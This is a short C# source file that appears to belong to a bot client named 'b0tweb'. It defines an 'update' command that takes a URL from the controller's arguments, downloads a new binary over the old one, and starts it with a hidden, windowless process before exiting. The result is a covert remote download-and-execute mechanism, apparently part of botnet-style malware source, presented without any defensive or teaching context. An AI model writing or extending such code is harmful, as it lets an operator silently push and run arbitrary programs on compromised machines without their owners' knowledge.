using System;
using System.Diagnostics;
using System.IO;

namespace b0tweb.Commands
{
    class UpdateCommand : AbstractCommand
    {
        public override string Command => "update";

        protected override string ExecuteCommand(string[] args)
        {
            File.Move(FileHelper.GetBinaryPath(), FileHelper.GetBinaryOldPath());

            int status = HTTPHelper.Download(args[0], FileHelper.GetBinaryPath());

            if (status != 0)
            {
                File.Move(FileHelper.GetBinaryOldPath(), FileHelper.GetBinaryPath());
                return "Updated failed...";
            }

            ProcessStartInfo info = new ProcessStartInfo(FileHelper.GetBinaryPath())
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            Process process = new Process()
            {
                StartInfo = info
            };

            process.Start();

            Environment.Exit(0);

            // Should never reach this point.
            return "System exit failed: !!" + process.StandardOutput.ReadToEnd();
        }
    }
}
